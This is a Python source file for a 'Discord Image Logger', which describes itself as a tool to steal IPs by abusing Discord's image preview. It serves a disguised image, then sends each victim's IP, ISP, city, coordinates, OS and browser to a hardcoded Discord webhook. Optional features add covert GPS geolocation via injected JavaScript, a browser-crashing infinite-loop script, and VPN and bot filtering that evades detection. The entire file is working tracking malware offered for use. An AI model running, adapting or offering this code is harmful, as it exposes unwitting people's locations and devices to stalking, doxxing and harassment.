# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1134270333306798281/1-jJqZxwI7wvgawSmkGA-ozLUBMNA-uDbSp6sN9Ag1hNfaos-tQ-8OWxrrkBY4_kCH7c",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image RickRoll", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
